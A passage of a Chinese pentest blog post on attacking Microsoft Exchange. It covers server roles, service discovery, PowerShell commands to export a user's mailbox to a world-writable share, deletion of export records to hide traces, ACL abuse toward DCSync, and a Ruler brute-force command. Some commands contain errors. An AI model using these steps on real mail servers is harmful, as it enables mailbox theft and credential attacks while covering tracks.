<!DOCTYPE html>
<html lang="zh-cn">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
        <title>Exchange 漏洞利用 - Geekby&#39;s Blog</title><meta name="Description" content="Exchange 漏洞利用"><meta property="og:url" content="http://localhost:1313/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
  <meta property="og:site_name" content="Geekby&#39;s Blog">
  <meta property="og:title" content="Exchange 漏洞利用">
  <meta property="og:description" content="Exchange 漏洞利用">
  <meta property="og:locale" content="zh_cn">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2021-10-14T22:13:00+08:00">
    <meta property="article:modified_time" content="2021-10-16T19:00:00+08:00">
    <meta property="article:tag" content="域安全">
    <meta property="article:tag" content="内网渗透">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Exchange 漏洞利用">
  <meta name="twitter:description" content="Exchange 漏洞利用">
<meta name="application-name" content="Geekby&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" /><link rel="prev" href="http://localhost:1313/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" /><link rel="next" href="http://localhost:1313/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Exchange 漏洞利用",
        "inLanguage": "zh-cn",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/localhost:1313\/2021\/10\/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\/"
        },"image": ["http:\/\/localhost:1313\/logo.png"],"genre": "posts","keywords": "域安全, 内网渗透","wordcount":  2103 ,
        "url": "http:\/\/localhost:1313\/2021\/10\/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\/","datePublished": "2021-10-14T22:13:00+08:00","dateModified": "2021-10-16T19:00:00+08:00","publisher": {
            "@type": "Organization",
            "name": "Geekby","logo": {
                    "@type": "ImageObject",
                    "url": "http:\/\/localhost:1313\/images\/avatar.png",
                    "width":  358 ,
                    "height":  330 
                }},"author": {
                "@type": "Person",
                "name": "Geekby"
            },"description": "Exchange 漏洞利用"
    }
    </script></head>
    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                    <i class="fas fa-adjust fa-fw"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        取消
                    </a>
                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                <i class="fas fa-adjust fa-fw"></i>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">目录</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animated flipInX">Exchange 漏洞利用</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw"></i>内网渗透</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-10-14">2021-10-14</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2103 字&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 10 分钟&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>目录</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#1-安装">1 安装</a></li>
    <li><a href="#2-背景">2 背景</a>
      <ul>
        <li><a href="#21-相关概念">2.1 相关概念</a>
          <ul>
            <li><a href="#211-邮件服务器角色">2.1.1 邮件服务器角色</a></li>
            <li><a href="#212-客户端远程访问接口和协议">2.1.2 客户端/远程访问接口和协议</a></li>
          </ul>
        </li>
        <li><a href="#22-服务发现">2.2 服务发现</a>
          <ul>
            <li><a href="#221-基于端口扫描发现">2.2.1 基于端口扫描发现</a></li>
            <li><a href="#222-spn-查询">2.2.2 SPN 查询</a></li>
          </ul>
        </li>
        <li><a href="#23-exchange-基本操作">2.3 exchange 基本操作</a></li>
        <li><a href="#24-导出指定邮件">2.4 导出指定邮件</a>
          <ul>
            <li><a href="#241-配置用户的导入导出权限">2.4.1 配置用户的导入、导出权限</a></li>
          </ul>
        </li>
        <li><a href="#242-清理痕迹">2.4.2 清理痕迹</a></li>
      </ul>
    </li>
    <li><a href="#3-exchange-在域中的权限">3 Exchange 在域中的权限</a></li>
    <li><a href="#4-exchange-接口利用">4 Exchange 接口利用</a>
      <ul>
        <li><a href="#41-利用自动发现服务进行暴力破解">4.1 利用自动发现服务进行暴力破解</a></li>
        <li><a href="#42-password-spray">4.2 Password Spray</a></li>
      </ul>
    </li>
    <li><a href="#5-利用-exchange-接管域控">5 利用 Exchange 接管域控</a>
      <ul>
        <li><a href="#51-cve-2018-8581-ssrf-漏洞">5.1 CVE-2018-8581 SSRF 漏洞</a>
          <ul>
            <li><a href="#511-漏洞描述">5.1.1 漏洞描述</a></li>
            <li><a href="#512-受影响的系统版本">5.1.2 受影响的系统版本</a></li>
            <li><a href="#513-漏洞复现">5.1.3 漏洞复现</a></li>
          </ul>
        </li>
        <li><a href="#52-cve-2020-0688-反序列化漏洞">5.2 CVE-2020-0688 反序列化漏洞</a>
          <ul>
            <li><a href="#521-漏洞描述">5.2.1 漏洞描述</a></li>
            <li><a href="#522-受影响的系统版本">5.2.2 受影响的系统版本</a></li>
            <li><a href="#523-漏洞复现">5.2.3 漏洞复现</a>
              <ul>
                <li><a href="#5231-前提">5.2.3.1 前提</a></li>
                <li><a href="#5232-参数获取">5.2.3.2 参数获取</a></li>
                <li><a href="#5233-生成-payload">5.2.3.3 生成 payload</a></li>
              </ul>
            </li>
          </ul>
        </li>
        <li><a href="#53-proxylogon">5.3 ProxyLogon</a>
          <ul>
            <li><a href="#531-漏洞描述">5.3.1 漏洞描述</a>
              <ul>
                <li><a href="#5311-cas-架构">5.3.1.1 CAS 架构</a></li>
                <li><a href="#5312-frontend-proxy">5.3.1.2 Frontend Proxy</a></li>
                <li><a href="#5313-backend-rehydration-module">5.3.1.3 Backend Rehydration Module</a></li>
              </ul>
            </li>
            <li><a href="#532-受影响的版本">5.3.2 受影响的版本</a></li>
            <li><a href="#533-漏洞复现">5.3.3 漏洞复现</a>
              <ul>
                <li><a href="#5331-cve-2021-26855---pre-auth-ssrf">5.3.3.1 CVE-2021-26855 - Pre-auth SSRF</a></li>
                <li><a href="#cve-2021-27065">CVE-2021-27065</a></li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#参考">参考</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h1 id="exchange-漏洞利用">Exchange 漏洞利用</h1>
<h2 id="1-安装">1 安装</h2>
<blockquote>
<p>安装过程可参考：<a href="https://docs.microsoft.com/zh-cn/exchange/plan-and-deploy/prerequisites?view=exchserver-2016" target="_blank" rel="noopener noreffer">微软官方文档</a>和<a href="https://www.bookstack.cn/read/exchange/date-2018.12.31.16.40.58" target="_blank" rel="noopener noreffer">博客</a></p>
</blockquote>
<p>整体分为三步：</p>
<ul>
<li>
<p>满足前置条件</p>
</li>
<li>
<p>构建域中的结构</p>
<ul>
<li>
<p><code>Setup.exe /PrepareSchema /IAcceptExchangeServerLicenseTerms</code></p>
<p><code>Setup.exe /PAD /OrganizationName:PentestLab /IAcceptExchangeServerLicenseTerms</code></p>
</li>
</ul>
</li>
<li>
<p>Setup.exe 安装</p>
</li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161506993.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161506993.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161506993.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161506993.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161506993.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161506993.png-water_print" /></p>
<h2 id="2-背景">2 背景</h2>
<blockquote>
<p>Exchange Server 是微软公司的一套<strong>电子邮件服务组件</strong>，是个消息与协作系统。 简单而言，Exchange server 可以被用来构架应用于企业、学校的邮件系统。Exchange server 还是一个协作平台。在此基础上可以开发工作流，知识管理系统，Web 系统或者是其他消息系统。</p>
</blockquote>
<h3 id="21-相关概念">2.1 相关概念</h3>
<h4 id="211-邮件服务器角色">2.1.1 邮件服务器角色</h4>
<ul>
<li>邮件服务器
<ul>
<li>该角色是提供托管邮箱、公共文件夹以及相关的消息数据（如地址列表）的后端组件，是必选的服务器角色。</li>
</ul>
</li>
<li>客户端访问服务器
<ul>
<li>接收和处理来自于不同客户端的请求的中间层服务器角色，该角色服务器提供了对使用不同协议进行访问的支持，每个 Exchange 环境中至少需要部署一个客户端访问服务器，客户端访问服务器提供了对以下不同接口访问 Exchange 服务器的处理。</li>
</ul>
</li>
<li>集线传输服务器
<ul>
<li>或称中心传输服务器，该服务器角色的核心服务就是 Microsoft Exchange Transport，负责处理 Mail Flow（这又是Exchange中的一大知识点，Exchange 管理员需要通过 MailFlow 实现邮件出站与进站配置）、对邮件进行路由、以及在 Exchange 组织中进行分发，该服务器角色处理所有发往属于本地邮箱的邮件和发往外部邮箱的邮件，并确保邮件发送者和接收者的地址被正确解析并执行特定策略（如邮件地址过滤、内容过滤、格式转换等），该服务器角色相当于一个邮件传输的中继站点，每个 Exchange 环境中至少需要部署一个集线传输服务器。</li>
</ul>
</li>
<li>统一消息服务器
<ul>
<li>将专用交换机（private branch exchange/PBX） 和 Exchange Server 集成在一起，以允许邮箱用户可以在邮件中发送存储语音消息和传真消息，可选角色。</li>
</ul>
</li>
<li>边缘消息服务器
<ul>
<li>该服务器角色作为专用服务器可以用于路由发往内部或外部的邮件，通常部署于网络边界并用于设置安全边界。其接受来自内部组织的邮件和来自外部可信服务器的邮件，然后应用特定的反垃圾邮件、反病毒策略，最后将通过策略筛选的邮件路由到内部的集线传输服务器，可选角色。</li>
</ul>
</li>
</ul>
<p>在 Exchange Server 2013 及以后的版本中，服务器角色精简为三个，分别是邮箱服务器、客户端访问服务器和边缘传输服务器，其中邮箱服务器角色和客户端访问服务器角色通常被安装在同一台服务器中。</p>
<h4 id="212-客户端远程访问接口和协议">2.1.2 客户端/远程访问接口和协议</h4>
<ul>
<li>OWA - Outlook Web App
<ul>
<li>客户端登录使用，地址通常为 <a href="http://doamin/owa/" target="_blank" rel="noopener noreffer">http://DOAMIN/owa/</a></li>
</ul>
</li>
<li>ECP - Exchange Administrative Center
<ul>
<li>管理中心，管理员用于管理组织中的 Exchange 的 Web 控制台，地址通常为 <a href="http://domain/ecp/" target="_blank" rel="noopener noreffer">http://DOMAIN/ecp/</a></li>
</ul>
</li>
<li>EWS - Exchange Web Service
<ul>
<li>网络管理接口。Exchange 提供了一套 API 编程接口可供开发者调用，用于访问 Exchange 服务器，与邮件、联系人、日历等功能进行交互和管理操作，在 Exchange Server 2007 中被提出。微软基于标准的 Web Service 开发 EWS，EWS 实现的客户端与服务端之间通过基于 HTTP 的 SOAP 交互。</li>
</ul>
</li>
</ul>
<h3 id="22-服务发现">2.2 服务发现</h3>
<h4 id="221-基于端口扫描发现">2.2.1 基于端口扫描发现</h4>
<ul>
<li>25 端口 SMTP 指纹显示 Exchange smtpd</li>
<li>80 端口为 iis</li>
<li>443 端口开放</li>
</ul>
<h4 id="222-spn-查询">2.2.2 SPN 查询</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">setspn -T pentest.com -F -Q */*
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="23-exchange-基本操作">2.3 exchange 基本操作</h3>
<ul>
<li>查看 MailBox 数据库</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Add-pssnapin</span> <span class="n">microsoft</span><span class="p">.</span><span class="n">exchange</span><span class="p">*</span>
</span></span><span class="line"><span class="cl"><span class="nb">Get-MailboxDatabase</span> <span class="n">-server</span> <span class="s2">&#34;Exchange&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161518726.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161518726.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161518726.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161518726.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161518726.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161518726.png-water_print" /></p>
<ul>
<li>查看指定用户邮箱使用信息</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-Mailboxstatistics</span> <span class="n">-identity</span> <span class="n">administrator</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">DisplayName</span><span class="p">,</span><span class="n">ItemCount</span><span class="p">,</span><span class="n">TotalItemSize</span><span class="p">,</span><span class="n">LastLogonTime</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161518938.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161518938.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161518938.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161518938.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161518938.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161518938.png-water_print" /></p>
<ul>
<li>查看全部用户邮箱使用信息</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-Mailbox</span> <span class="n">-ResultSize</span> <span class="n">Unlimited</span> <span class="p">|</span> <span class="nb">Get-MailboxStatistics</span> <span class="p">|</span> <span class="nb">Sort-Object</span> <span class="n">TotalItemSize</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="24-导出指定邮件">2.4 导出指定邮件</h3>
<h4 id="241-配置用户的导入导出权限">2.4.1 配置用户的导入、导出权限</h4>
<ul>
<li>查看用户权限</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># 查看具有导出权限的用户</span>
</span></span><span class="line"><span class="cl"><span class="nb">Get-ManagementRoleAssignment</span> <span class="n">-role</span> <span class="s2">&#34;Mailbox Import Export&#34;</span> <span class="p">|</span> <span class="nb">Format-List</span> <span class="n">RoleAssigneeName</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>添加用户角色权限</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">New-ManagementRoleAssignment</span> <span class="n">-Name</span> <span class="s2">&#34;Import Export_Domain Admins&#34;</span> <span class="n">-User</span> <span class="s2">&#34;Administrator&#34;</span> <span class="n">-Role</span> <span class="s2">&#34;Mailbox Import Export&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>删除用户权限</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">New-ManagementRoleAssignment</span> <span class="s2">&#34;Import Export_Domain Admins&#34;</span> <span class="n">-Confirm:</span><span class="vm">$false</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>设置网络共享文件夹</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">net</span> <span class="n">share</span> <span class="n">inetpub</span><span class="p">=</span><span class="n">c:</span><span class="p">\</span><span class="n">inetpub</span> <span class="p">/</span><span class="n">grant</span><span class="err">:</span><span class="n">everyone</span><span class="p">,</span><span class="n">full</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>导出邮件</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">New-MailboxExportRequest</span> <span class="n">-Mailbox</span> <span class="n">administrator</span> <span class="n">-FilePath</span> <span class="p">\\</span><span class="n">IP</span><span class="p">\</span><span class="n">inetpub</span><span class="p">\</span><span class="n">administrator</span><span class="p">.</span><span class="py">pst</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="242-清理痕迹">2.4.2 清理痕迹</h3>
<ul>
<li>查看之前的导出记录</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-MailboxExportRequest</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>将指定用户的已完成导出请求删除</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Remove-MailboxExportRequest</span> <span class="n">-Identify</span> <span class="n">Administrator</span><span class="p">\</span><span class="n">mailboxexport</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>将所有已完成导出的请求删除</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-MailboxExportRequest</span> <span class="n">-Status</span> <span class="n">Completed</span> <span class="p">|</span> <span class="nb">Remove-MailboxExportRequest</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="3-exchange-在域中的权限">3 Exchange 在域中的权限</h2>
<p>查看 Exchange 服务器的隶属关系，发现其属于：<code>Exchange Security Groups</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161530352.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161530352.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161530352.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161530352.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161530352.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161530352.png-water_print" /></p>
<p>再跟进 <code>CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=pentest,DC=lab</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161534731.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161534731.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161534731.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161534731.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161534731.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161534731.png-water_print" /></p>
<p>该组又隶属于 <code>CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=pentest,DC=lab</code>，该组包含通过管理服务代表用户运行 Exchange cmdlet 的 Exchange 服务器。其成员有权读取和修改所有 Windows 帐户和组。</p>
<p>简单来说，就是 Exchange 服务器有权限修改域内任意用户的 ACL。</p>
<p>因此，可以利用 Exchange 修改用户 ACL，然后在利用 Dcsync 来 dump hash。</p>
<h2 id="4-exchange-接口利用">4 Exchange 接口利用</h2>
<p>上文提到，Exchange 提供了多种客户端邮箱接口和服务接口，对于渗透测试人员而言，这些接口就是踏入 Exchange 内部的第一道关卡，提供服务的接口需要有效的用户凭证信息，显然，用户名与密码破解是摆在面前的第一个尝试。在企业域环境中，Exchange 与域服务集合，域用户账户密码就是 Exchange 邮箱的账户密码，因此，如果通过暴力破解等手段成功获取了邮箱用户密码，在通常情况下也就间接获得了域用户密码。</p>
<h3 id="41-利用自动发现服务进行暴力破解">4.1 利用自动发现服务进行暴力破解</h3>
<p>Autodiscover 自动发现服务使用 Autodiscover.xml 配置文件来对用户进行自动设置，获取该自动配置文件需要用户认证，如访问 <a href="http://exchange.pentest.lab/Autodiscover/Autodiscover.xml" target="_blank" rel="noopener noreffer">http://exchange.pentest.lab/Autodiscover/Autodiscover.xml</a> 文件将提示需要认证，如下为认证通过，将获取到如下的 XML 文件内容：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161545086.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161545086.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161545086.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161545086.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161545086.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161545086.png-water_print" /></p>
<p>利用这个接口，可以对邮箱账号做暴力破解。<a href="https://github.com/sensepost/ruler" target="_blank" rel="noopener noreffer">Ruler</a> 提供了对 Exchange 的自动配置文件接口进行认证的暴力破解，通过配置线程数、间隔时间可以限制破解速度防止多次登陆失败触发告警或账户被封禁。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./ruler --url https://172.16.147.4/autodiscover/autodiscover.xml --domain pentest.lab --insecure brute --users user.txt --passwords pass.txt --delay <span class="m">0</span> --verbose
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161556191.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161556191.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161556191.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161556191.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161556191.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161556191.png-water_print" /></p>
<h3 id="42-password-spray">4.2 Password Spray</h3>
<p>password spray 同样是一种破解账户密码的方法，与常规的暴力破解方法不同的是，password spary 针对一批账户进行破解，每次对单个用户账户进行一次或少数次登陆尝试后换用下一个用户进行尝试，如此反复进行并间隔一定时间，以此方法躲避多次暴力破解的检测和账户锁定的风险。</p>
